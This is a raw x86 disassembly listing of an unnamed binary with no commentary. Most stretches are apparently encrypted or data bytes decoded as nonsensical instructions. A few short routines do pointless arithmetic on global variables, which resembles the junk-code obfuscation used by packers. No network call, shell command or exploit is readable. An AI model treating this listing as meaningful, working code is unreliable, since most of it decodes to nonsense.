  4060f2:	loopne 0x40615b
  4060f4:	mov    ebx,0x850c31dc
  4060f9:	in     al,dx
  4060fa:	loop   0x406101
  4060fc:	cmp    ecx,esi
  4060fe:	sbb    ch,BYTE PTR [ebx]
  406100:	outs   dx,BYTE PTR ds:[esi]
  406101:	cmp    eax,0x9bc914cd
  406106:	inc    esi
  406107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406108:	test   DWORD PTR [esi-0x2d6d8441],edi
  40610e:	out    dx,al
  40610f:	test   ah,0x9d
  406112:	dec    esp
  406113:	enter  0xe5fe,0x66
  406117:	nop
  406118:	das    
  406119:	das    
  40611a:	nop
  40611b:	cli    
  40611c:	inc    ebp
  40611d:	dec    ecx
  40611e:	inc    edx
  40611f:	stos   BYTE PTR es:[edi],al
  406120:	arpl   WORD PTR [eax],dx
  406122:	out    dx,eax
  406123:	add    al,0xad
  406125:	retf   
  406126:	out    0xf5,eax
  406128:	lock and DWORD PTR [edx-0x220897fb],esp
  40612f:	sar    BYTE PTR [ebp+edi*1-0x1f],0xd4
  406134:	add    edi,esp
  406136:	push   ebx
  406137:	aad    0xbf
  406139:	sar    BYTE PTR [ecx+0x4d],1
  40613c:	or     eax,0x781c1ab7
  406141:	scas   al,BYTE PTR es:[edi]
  406142:	std    
  406143:	sti    
  406144:	mov    al,ds:0xbcdeb58a
  406149:	xor    esi,esp
  40614b:	arpl   WORD PTR [edi],bp
  40614d:	jne    0x4060d3
  40614f:	mov    esp,0x1738443c
  406154:	mov    al,0xac
  406156:	mov    ds:0x4767d831,al
  40615b:	adc    al,0x1d
  40615d:	repnz repz push esi
  406160:	add    eax,0x13135a0
  406165:	xor    bl,bl
  406167:	mov    BYTE PTR [edx+0x58],al
  40616a:	loop   0x4061a9
  40616c:	mov    dl,0xf2
  40616e:	mov    al,ds:0x9841156e
  406173:	aad    0xc7
  406175:	pop    es
  406176:	ins    DWORD PTR es:[edi],dx
  406177:	xchg   edx,eax
  406178:	cmp    al,0x31
  40617a:	mov    esp,DWORD PTR [edi+0x452956f7]
  406180:	cld    
  406181:	jmp    0xbf24:0x59d87bf
  406188:	pop    ds
  406189:	call   0x2257d448
  40618e:	sbb    al,0xd1
  406190:	jge    0x4061dc
  406192:	jmp    0x406193
  406194:	mov    bl,0x7e
  406196:	dec    esp
  406197:	popa   
  406198:	xlat   BYTE PTR ds:[ebx]
  406199:	mov    esi,0xaf4c61f5
  40619e:	(bad)  
  40619f:	pop    ebp
  4061a0:	mov    ebx,0xca564f3a
  4061a5:	lahf   
  4061a6:	inc    edx
  4061a7:	stc    
  4061a8:	dec    edi
  4061a9:	mov    al,ds:0x441c0991
  4061ae:	ds (bad) 
  4061b0:	jns    0x4061b7
  4061b2:	bound  edx,QWORD PTR [ecx+0x29]
  4061b5:	push   eax
  4061b6:	pushf  
  4061b7:	es xor al,0xfb
  4061ba:	mov    edx,0x9b67dfb9
  4061bf:	loope  0x406179
  4061c1:	pop    edx
  4061c2:	daa    
  4061c3:	adc    eax,DWORD PTR [esi-0x78]
  4061c6:	push   0x51
  4061c8:	cmp    eax,0x777832e9
  4061cd:	loope  0x406156
  4061cf:	push   edi
  4061d0:	mov    eax,0xf015f3dd
  4061d5:	mov    ebx,0xf5deeebc
  4061da:	fadd   DWORD PTR [ebx]
  4061dc:	xchg   DWORD PTR [ebp-0x62d40217],edi
  4061e2:	dec    esi
  4061e3:	or     al,BYTE PTR [eax+0x12]
  4061e6:	and    BYTE PTR [bx+0x1d],ah
  4061ea:	jmp    0x35d4b82c
  4061ef:	mov    edx,0x31e7af9b
  4061f4:	jmp    0xf2c3d593
  4061f9:	jb     0x406233
  4061fb:	lods   eax,DWORD PTR ds:[esi]
  4061fc:	shl    DWORD PTR [esp+ebp*4-0x65a24f26],cl
  406203:	leave  
  406204:	sbb    DWORD PTR [ebx-0x31],0x98d33080
  40620b:	push   eax
  40620c:	lahf   
  40620d:	bswap  ecx
  40620f:	xchg   ecx,eax
  406210:	pop    ds
  406211:	or     al,0xf
  406213:	dec    eax
  406214:	dec    edx
  406215:	ds inc eax
  406217:	mov    edi,0xaa00a0b1
  40621c:	aad    0x91
  40621e:	xchg   esi,eax
  40621f:	or     eax,0xb5525ad0
  406224:	push   eax
  406225:	push   ebp
  406226:	ds mov cl,0x4a
  406229:	call   0xc1b4:0xcd3a33e1
  406230:	mov    bh,0xf6
  406232:	lds    esp,FWORD PTR [eax]
  406234:	jo     0x40627e
  406236:	cmp    al,0x7
  406238:	fbstp  TBYTE PTR [edx-0x44]
  40623b:	daa    
  40623c:	aas    
  40623d:	cmc    
  40623e:	lods   al,BYTE PTR ds:[esi]
  40623f:	xchg   edx,eax
  406240:	aaa    
  406241:	add    al,bl
  406243:	test   DWORD PTR [ecx-0x46562358],eax
  406249:	in     al,dx
  40624a:	ins    DWORD PTR es:[edi],dx
  40624b:	icebp  
  40624c:	or     al,0x21
  40624e:	sbb    BYTE PTR [eax],0x5
  406251:	jl     0x4061ea
  406253:	jge    0x4061e1
  406255:	shr    BYTE PTR [ecx+0x3c],cl
  406258:	mov    edi,0xad7fbef4
  40625d:	ficomp WORD PTR es:[ebx]
  406260:	pop    eax
  406261:	mov    eax,ds:0x54c3aa28
  406266:	loop   0x406262
  406268:	shr    BYTE PTR [eax+0x5a],cl
  40626b:	pop    ss
  40626c:	mov    edx,0x17d31165
  406271:	add    BYTE PTR [edi-0x8bd8463],ah
  406277:	mov    ah,0x63
  406279:	push   0xc629548b
  40627e:	not    BYTE PTR [edi+0x2d5fdd5b]
  406284:	pop    ebp
  406285:	(bad)  
  406286:	popf   
  406287:	ja     0x40625e
  406289:	dec    ebp
  40628a:	and    ah,bh
  40628c:	fucomip st,st(6)
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fe09,0x42fe86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e7f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fe72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fe72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fe72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e63b
  4062e2:	cmp    DWORD PTR ds:0x42fe72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fe72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fe72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fe72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fe72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	push   cs
  40632f:	push   edx
  406330:	stc    
  406331:	or     al,0x8c
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x40632a
  40633b:	adc    eax,0xfbca1f63
  406340:	sbb    ebp,DWORD PTR [edi+0x7ea0dc7]
  406346:	jnp    0x406334
  406348:	inc    esp
  406349:	sub    al,0x31
  40634b:	dec    ebx
  40634c:	adc    ah,BYTE PTR ss:[edx]
  40634f:	jo     0x4063c8
  406351:	sbb    ebx,0xffffffd6
  406354:	loope  0x4063a7
  406356:	fild   QWORD PTR gs:0xf78f090b
  40635d:	lods   eax,DWORD PTR ds:[esi]
  40635e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635f:	sbb    al,0xe8
  406361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406362:	mov    ebx,0x64b25a33
  406367:	aaa    
  406368:	add    DWORD PTR [ecx-0x32a91254],esp
  40636e:	int3   
  40636f:	inc    ecx
  406370:	push   edx
  406371:	jae    0x4063ea
  406373:	repz int 0x92
  406376:	xor    edi,DWORD PTR [esi+0x26a225d3]
  40637c:	mov    eax,ds:0x67a708fe
  406381:	cmp    edx,0x1d
  406384:	stc    
  406385:	jns    0x4063a7
  406387:	int    0xda
  406389:	fild   DWORD PTR [ebx+ebx*1]
  40638c:	mov    eax,ds:0xbfcb81c4
  406391:	or     eax,0xfdd6d2c6
  406396:	mov    ds:0x5ebe6789,al
  40639b:	mov    dl,0x7d
  40639d:	mov    dl,0x66
  40639f:	adc    al,0xa6
  4063a1:	jge    0x4063e5
  4063a3:	test   eax,0x591c7632
  4063a8:	aam    0x18
  4063aa:	adc    DWORD PTR [edi-0x6c],esp
  4063ad:	test   eax,0x4fd080c1
  4063b2:	ins    BYTE PTR es:[edi],dx
  4063b3:	sbb    BYTE PTR cs:[ebx-0x64af84dd],dl
  4063ba:	cmp    cl,0xb6
  4063bd:	and    eax,0xc657c200
  4063c2:	int    0x74
  4063c4:	or     bl,BYTE PTR [esi]
  4063c6:	outs   dx,DWORD PTR ds:[esi]
  4063c7:	sbb    ecx,DWORD PTR [ecx-0x3175de9a]
  4063cd:	jae    0x406358
  4063cf:	push   eax
  4063d0:	adc    edi,ecx
  4063d2:	gs and eax,0xc1c3050e
  4063d8:	inc    ebx
  4063d9:	mov    dh,0xad
  4063db:	inc    ecx
  4063dc:	and    esi,DWORD PTR [ecx+ebp*4]
  4063df:	(bad)  
  4063e0:	xlat   BYTE PTR ds:[ebx]
  4063e1:	jmp    0x2f96:0xe068e24
  4063e8:	jae    0x406441
  4063ea:	outs   dx,DWORD PTR ds:[esi]
  4063eb:	inc    eax
  4063ec:	mov    ds:0xdeb756ad,eax
  4063f1:	fdivr  DWORD PTR [ebp+0x39]
  4063f4:	sub    BYTE PTR [esi],cl
  4063f6:	dec    ebp
  4063f8:	mov    ah,BYTE PTR [ecx+0xc582e76]
  4063fe:	dec    ebp
  4063ff:	adc    bl,BYTE PTR [edx]
  406401:	mov    dh,BYTE PTR [edi]
  406403:	and    eax,0xe9fc1eef
  406408:	mov    ecx,0x995ad075
  40640d:	xchg   esp,eax
  40640e:	int    0xd7
  406410:	ds ins DWORD PTR es:[edi],dx
  406412:	jno    0x4063cd
  406414:	mov    bl,0xdc
  406416:	inc    ebx
  406417:	mov    dl,0x86
  406419:	(bad)  
  40641a:	push   eax
  40641b:	mov    bh,BYTE PTR [ebx]
  40641d:	or     eax,0x81022297
  406422:	ret    
  406423:	sbb    eax,0xa288b375
  406428:	sti    
  406429:	fbstp  TBYTE PTR [edi-0x11]
  40642c:	and    BYTE PTR [ebp+0x165aca0d],bh
  406432:	push   ecx
  406433:	rcr    BYTE PTR [esi+0x2b],cl
  406436:	lock lds ebp,FWORD PTR [esi+ebp*1+0x1c35d9b3]
  40643e:	ficom  WORD PTR [edi-0x288f0d35]
  406444:	shl    BYTE PTR [edx+edx*1+0x5618719f],1
  40644b:	inc    esp
  40644c:	jp     0x406440
  40644e:	rcl    BYTE PTR [edx],1
  406450:	xor    edi,ebp
  406452:	dec    ebx
  406453:	jp     0x40646f
  406455:	mov    esi,0xb081992d
  40645a:	adc    al,0x3e
  40645c:	fiadd  WORD PTR [ebx+0x65]
  40645f:	popf   
  406460:	sub    eax,0xb8564e76
  406465:	mov    ax,ds:0x89dd1d14
  40646b:	xor    dh,cl
  40646d:	std    
  40646e:	shr    DWORD PTR [ebp+ecx*2-0x77a11980],cl
  406475:	pop    ecx
  406476:	sbb    dl,BYTE PTR [esi+0x225e0d3]
  40647c:	lea    ecx,[eax-0x67]
  40647f:	(bad)  
  406480:	int    0x93
  406482:	jbe    0x406457
  406484:	fwait
  406485:	das    
  406486:	scas   eax,DWORD PTR es:[edi]
  406487:	rcl    DWORD PTR [ebx-0x52362b01],cl
  40648d:	mov    ebp,0xff50f6a2
  406492:	cmp    cl,BYTE PTR [eax-0x35]
  406495:	and    al,0x1f
  406497:	or     edx,esp
  406499:	push   ebp
  40649a:	cli    
  40649b:	mov    al,0xc9
  40649d:	into   
  40649e:	adc    al,0x60
  4064a0:	mov    ebx,0xc81973eb
  4064a5:	ss (bad) 
  4064a7:	jbe    0x4064c3
  4064a9:	pushf  
  4064aa:	lea    ecx,[edi-0x68]
  4064ad:	xchg   edx,eax
  4064ae:	jb     0x40648d
  4064b0:	mov    DWORD PTR [esi],eax
  4064b2:	lods   al,BYTE PTR ds:[esi]
  4064b3:	lods   al,BYTE PTR ds:[esi]
  4064b4:	inc    ecx
  4064b5:	jnp    0x4064c2
  4064b7:	outs   dx,BYTE PTR ds:[esi]
  4064b8:	xchg   esi,eax
  4064b9:	jp     0x40645e
  4064bb:	inc    ecx
  4064bc:	dec    esp
  4064bd:	jle    0x4064ab
  4064bf:	in     al,0xe5
  4064c1:	inc    ebp
  4064c2:	stos   DWORD PTR es:[edi],eax
  4064c3:	ins    DWORD PTR es:[edi],dx
  4064c4:	mov    eax,0xf23bc6c5
  4064c9:	pusha  
  4064ca:	into   
  4064cb:	xor    DWORD PTR [ebp-0x44],ecx
  4064ce:	ins    BYTE PTR es:[edi],dx
  4064cf:	cli    
  4064d0:	push   edi
  4064d1:	adc    DWORD PTR [edi-0x2f35c55b],edi
  4064d7:	jns    0x4064fc
  4064d9:	jmp    0xe324:0x4195001b
  4064e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e1:	push   0xc2c95e30
  4064e6:	sbb    BYTE PTR [eax],al
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fe76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fdf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fe72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fe72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fdd9,0x42e7fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	push   ss
  406567:	loop   0x4064eb
  406569:	in     al,dx
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	push   0xfffffff6
  406574:	div    DWORD PTR [edi]
  406576:	mov    WORD PTR [ebx-0x33],ss
  406579:	(bad)  
  40657a:	dec    edi
  40657b:	pop    edi
  40657c:	dec    esi
  40657d:	mov    ebp,0xfb655c5c
  406582:	out    dx,al
  406583:	aam    0x20
  406585:	jge    0x4065f6
  406587:	call   esi
  406589:	call   0xe17a0e61
  40658e:	push   es
  40658f:	mov    edx,0x54d64e21
  406594:	ret    0xbd49
  406597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406598:	ds pop eax
  40659a:	shr    DWORD PTR ds:0xecacb450,1
  4065a0:	cmc    
  4065a1:	jmp    0x406618
  4065a3:	mov    ecx,0xa497b5e2
  4065a8:	das    
  4065a9:	sbb    dh,BYTE PTR [edx-0x3c]
  4065ac:	push   0xffffffee
  4065ae:	jmp    0x6008:0x90d7501f
  4065b5:	iret   
  4065b6:	lea    edi,[ebp-0x6d]
  4065b9:	int    0x8a
  4065bb:	cmc    
  4065bc:	or     al,0xa3
  4065be:	jge    0x4065f8
  4065c0:	lock sub BYTE PTR ds:0x93d86beb,ah
  4065c7:	sub    ebx,0x3831c7d9
  4065cd:	xor    BYTE PTR [edi],bh
  4065cf:	sub    DWORD PTR [eax+0x51],0xffffffbb
  4065d3:	out    dx,eax
  4065d4:	out    dx,al
  4065d5:	scas   eax,DWORD PTR es:[edi]
  4065d6:	repnz shl DWORD PTR [ebx+0x2bf21e60],cl
  4065dd:	les    eax,FWORD PTR [eax]
  4065df:	iret   
  4065e0:	jb     0x40662e
  4065e2:	xchg   edi,eax
  4065e3:	add    edx,DWORD PTR [edi+0xe]
  4065e6:	gs cmc 
  4065e8:	je     0x406622
  4065ea:	mov    al,0xc6
  4065ec:	and    al,bh
  4065ee:	push   eax
  4065ef:	sbb    BYTE PTR [edx],dl
  4065f1:	(bad)  
  4065f2:	mov    eax,ds:0x8d48a465
  4065f7:	sbb    al,BYTE PTR [ebx+esi*4]
  4065fa:	sub    al,0xef
  4065fc:	addr16 (bad) 
  4065fe:	mov    edi,0x73269f10
  406603:	inc    eax
  406604:	ins    BYTE PTR es:[edi],dx
  406605:	into   
  406606:	dec    ebp
  406607:	or     DWORD PTR [ecx],0x3e
  40660a:	and    esi,edi
  40660c:	out    dx,eax
  40660d:	inc    edi
  40660e:	pop    esi
  40660f:	cs cld 
  406611:	int3   
  406612:	adc    BYTE PTR [eax],0xcd
  406615:	jae    0x40667c
  406617:	(bad)  
  406618:	pusha  
  406619:	mov    eax,ds:0x623a3db
  40661e:	repnz (bad) 
  406620:	xor    DWORD PTR [esi+0x4a2f7674],ebx
  406626:	(bad)  
  406627:	stc    
  406628:	nop
  406629:	jg     0x406689
  40662b:	je     0x406643
  40662d:	jg     0x4065ca
  40662f:	push   edi
  406630:	cmp    al,0x94
  406632:	mov    bl,0x49
  406634:	cwde   
  406635:	je     0x40667d
  406637:	ret    0xac84
  40663a:	mov    dl,0xb2
  40663c:	jno    0x406669
  40663e:	jb     0x40666e
  406640:	test   DWORD PTR [ebx+0x11],ebx
  406643:	sub    ebx,DWORD PTR [edx-0x5b99438c]
  406649:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40664b:	leave  
  40664c:	adc    eax,0x59479287
  406651:	aad    0x96
  406653:	mov    bh,0xf6
  406655:	cmp    al,0x9
  406657:	lea    ecx,[edx+0x3f]
  40665a:	dec    esi
  40665b:	push   edi
  40665c:	jae    0x406689
  40665e:	push   ds
  40665f:	cmp    ebx,DWORD PTR [esi-0x28]
  406662:	jno    0x406616
  406664:	push   0xffffff86
  406666:	xor    DWORD PTR [edx-0x7],ebx
  406669:	daa    
  40666a:	cmp    dl,BYTE PTR [edx]
  40666c:	lock add ah,BYTE PTR [esi+0x66b82dd7]
  406673:	mov    bl,0xe2
  406675:	xchg   edx,eax
  406676:	pop    es
  406677:	pop    ecx
  406678:	pop    ds
  406679:	nop
  40667a:	stos   BYTE PTR es:[edi],al
  40667b:	sub    BYTE PTR [edi+ebx*8+0x7cda70d9],0x65
  406683:	test   al,0x5e
  406685:	jecxz  0x4066b2
  406687:	jmp    0x9cd6:0x11ba890b
  40668e:	icebp  
  40668f:	jne    0x40667b
  406691:	xchg   BYTE PTR [ebx+esi*8-0x4],dl
  406695:	into   
  406696:	sar    dl,cl
  406698:	push   ecx
  406699:	aad    0x19
  40669b:	xchg   esi,eax
  40669c:	loopne 0x4066e0
  40669e:	aas    
  40669f:	into   
  4066a0:	and    al,0x6f
  4066a2:	sbb    eax,0x7021842c
  4066a7:	mov    edx,0xa4e6eb3a
  4066ac:	xchg   edi,eax
  4066ad:	adc    ecx,eax
  4066af:	mov    dl,BYTE PTR [esi+ebx*4+0x3e0e3d75]
  4066b6:	inc    esi
  4066b7:	fild   WORD PTR [ebx+0x3f227bd9]
  4066bd:	scas   al,BYTE PTR es:[edi]
  4066be:	xchg   ebx,eax
  4066bf:	lds    edx,FWORD PTR [edi+0x7f]
  4066c2:	jg     0x406666
  4066c4:	cmp    al,0x12
  4066c6:	cs mov bh,0x75
  4066c9:	sbb    eax,0x48f1157f
  4066ce:	popf   
  4066cf:	push   ss
  4066d0:	sbb    al,0x67
  4066d2:	jecxz  0x40668f
  4066d4:	aas    
  4066d5:	das    
  4066d6:	xchg   edx,eax
  4066d7:	mov    ch,0x8d
  4066d9:	jle    0x4066df
  4066db:	mov    DWORD PTR [edi+0x6b129e31],edi
  4066e1:	test   DWORD PTR [ecx+esi*2],ecx
  4066e4:	aaa    
  4066e5:	sbb    ah,BYTE PTR [esi-0x49ff1ada]
  4066eb:	out    0xfd,eax
  4066ed:	pop    ds
  4066ee:	(bad)  
  4066ef:	mov    edx,0x2e7be61f
  4066f4:	sahf   
  4066f5:	call   0x94106f61
  4066fa:	dec    esp
  4066fb:	in     al,dx
  4066fc:	nop
  4066fd:	add    al,0x3b
  4066ff:	push   ss
  406700:	push   eax
  406701:	icebp  
  406702:	push   0xffffffc3
  406704:	push   ss
  406705:	inc    ebx
  406707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406708:	mov    cl,0xed
  40670a:	outs   dx,DWORD PTR ds:[esi]
  40670b:	cmp    DWORD PTR [esi+0x11a1bf09],eax
  406711:	push   es
  406712:	and    ecx,DWORD PTR ds:0xe3fe98c0
  406718:	push   edi
  406719:	jge    0x406732
  40671b:	mov    WORD PTR [edx+0x6173bd31],ss
  406721:	inc    esp
  406722:	adc    BYTE PTR [esp+edx*4],ch
  406725:	mov    dh,0x11
  406727:	dec    edx
  406728:	mov    bl,0xdd
  40672a:	out    0xcc,al
  40672c:	test   eax,0xa9bbc664
  406731:	pop    esi
  406732:	push   edx
  406733:	sub    edx,DWORD PTR [edx]
  406735:	stos   DWORD PTR es:[edi],eax
  406736:	add    al,0x4d
  406738:	xchg   edx,eax
  406739:	loope  0x406794
  40673b:	inc    ecx
  40673c:	mov    ah,ah
  40673e:	xchg   esi,eax
  40673f:	xchg   esi,eax
  406740:	ins    DWORD PTR es:[edi],dx
  406741:	in     al,dx
  406742:	and    BYTE PTR ds:0xc7de7b8,al
  406748:	dec    ebp
  406749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40674a:	lea    ecx,[eax]
  40674c:	data16 or BYTE PTR [ebx-0x41febd07],dl
  406753:	mov    bl,0x53
  406755:	dec    esp
  406756:	loop   0x406744
  406758:	(bad)  
  406759:	popa   
  40675a:	(bad)  
  40675c:	mov    eax,ds:0xe29523b5
  406761:	xor    al,0xe5
  406763:	sbb    ebp,DWORD PTR [ecx]
  406765:	icebp  
  406766:	shl    edi,0x5b
  406769:	xor    al,0x7f
  40676b:	pop    DWORD PTR [ebx-0x128fd50d]
  406771:	jge    0x4067a9
  406773:	xor    eax,esp
  406775:	sub    cl,BYTE PTR [ebx+0x7c5d9343]
  40677b:	dec    edx
  40677c:	jg     0x406773
  40677e:	ins    BYTE PTR es:[edi],dx
  40677f:	or     BYTE PTR [edi-0x6],0x23
  406783:	icebp  
  406784:	popa   
  406785:	pop    es
  406786:	je     0x40678f
  406788:	xchg   ebx,eax
  406789:	mov    ebx,0x5655acaf
  40678e:	xchg   esp,eax
  40678f:	mov    ecx,0x8dd9565d
  406794:	mov    cl,0x4
  406796:	push   cs
  406797:	sar    BYTE PTR [edi],cl
  406799:	call   0x61c6:0x1494e16f
  4067a0:	dec    eax
  4067a1:	push   eax
  4067a2:	mov    ebp,0x9b664991
  4067a7:	xchg   ecx,eax
  4067a8:	test   BYTE PTR [edx],ah
  4067aa:	in     eax,0xe6
  4067ac:	test   DWORD PTR [edi-0x37],ecx
  4067af:	lock mov edi,0x6cd357f8
  4067b5:	fisttp WORD PTR [eax-0x5e06f51]
  4067bb:	pushf  
  4067bc:	jne    0x40676f
  4067be:	pop    ss
  4067bf:	mov    dl,0x7e
  4067c1:	add    BYTE PTR [eax+0x47],cl
  4067c4:	pop    ebx
  4067c5:	push   0x78
  4067c7:	xor    eax,0x217867b7
  4067cc:	aam    0x29
  4067ce:	adc    DWORD PTR ds:0xd2cd3873,0x16
  4067d5:	pop    ss
  4067d6:	pop    ecx
  4067d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d8:	pop    ebp
  4067d9:	clc    
  4067da:	push   ecx
  4067db:	sbb    al,0x6d
  4067dd:	lds    esi,FWORD PTR [esp+ebx*2]
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fdd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e220,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e7fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fde5,0x42e813
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pop    esp
  406847:	jns    0x4067e8
  406849:	sub    esp,DWORD PTR [ebp-0x1d8f8fc8]
  40684f:	jle    0x4068c1
  406851:	jo     0x4067e4
  406853:	cmc    
  406854:	(bad)  
  406855:	ins    DWORD PTR es:[edi],dx
  406856:	(bad)  
  406857:	mov    al,ds:0x8c7bf973
  40685c:	fldcw  WORD PTR [esi+0xcf80c92]
  406862:	mov    edi,0xe15f9e06
  406867:	cmpps  xmm2,XMMWORD PTR [eax-0x35273804],0x6d
  40686f:	sbb    edx,0xd3c1c957
  406875:	nop
  406876:	pop    esp
  406877:	mov    eax,ss
  406879:	mov    ebp,0x32305a39
  40687e:	scas   al,BYTE PTR es:[edi]
  40687f:	or     al,cl
  406881:	inc    ebx
  406882:	mov    al,ds:0x60c5235
  406887:	mov    ds:0x81e9d635,eax
  40688c:	int3   
  40688d:	je     0x4068ba
  40688f:	mov    ch,0xfb
  406891:	dec    ecx
  406892:	mov    ebp,0xb428a202
  406897:	fwait
  406898:	push   0x7b6f236f
  40689d:	cwde   
  40689e:	es and al,0xa5
  4068a1:	mov    ds:0x8a6cd491,al
  4068a6:	popa   
  4068a7:	or     DWORD PTR [edi],ebp
  4068a9:	outs   dx,DWORD PTR ds:[esi]
  4068aa:	cdq    
  4068ab:	inc    eax
  4068ac:	xchg   edi,eax
  4068ad:	pop    esi
  4068ae:	cwde   
  4068af:	fiadd  DWORD PTR [edi-0x51]
  4068b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b3:	shl    DWORD PTR [edx],0x0
  4068b6:	outs   dx,DWORD PTR ds:[esi]
  4068b7:	inc    edi
  4068b8:	push   ebx
  4068b9:	push   ecx
  4068ba:	ja     0x4068b8
  4068bc:	push   ebp
  4068bd:	mov    ecx,0x42b7f41
  4068c2:	mov    ebx,0x22a5d74f
  4068c7:	add    dl,bh
  4068c9:	repnz xor al,0xf8
  4068cc:	in     eax,dx
  4068cd:	ds out dx,al
  4068cf:	push   edx
  4068d0:	popf   
  4068d1:	sub    ebp,DWORD PTR [edx]
  4068d3:	mov    BYTE PTR [ecx-0x3f9c59fc],ah
  4068d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068da:	dec    BYTE PTR [ecx]
  4068dc:	xchg   esp,eax
  4068dd:	push   esi
  4068de:	adc    dh,BYTE PTR [edi-0x532196cd]
  4068e4:	data16 sub BYTE PTR [eax+ebp*1],0x17
  4068e9:	loopne 0x40691d
  4068eb:	xchg   esi,eax
  4068ec:	mov    ch,0x2f
  4068ee:	in     eax,0x1e
  4068f0:	pusha  
  4068f1:	fwait
  4068f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068f3:	sub    edi,DWORD PTR [ebx+0x3ffe2c7d]
  4068f9:	mov    ah,0xf5
  4068fb:	mov    DWORD PTR [ecx],edi
  4068fd:	mov    BYTE PTR [edi+0x40],dh
  406900:	or     DWORD PTR [ebp+eax*1+0x5a],eax
  406904:	mov    DWORD PTR [eax],0xc208f324
  40690a:	arpl   WORD PTR [ebx],si
  40690c:	call   0x2c648ce8
  406911:	and    eax,0x30d49cba
  406916:	and    eax,0xa461f542
  40691b:	and    dl,ah
  40691d:	ja     0x406982
  40691f:	cmp    DWORD PTR [edi-0x7e],ebp
  406922:	xor    al,0x7b
  406924:	sar    esp,0x60
  406927:	jb     0x4068ba
  406929:	mov    esi,0x35631f37
  40692e:	aam    0x44
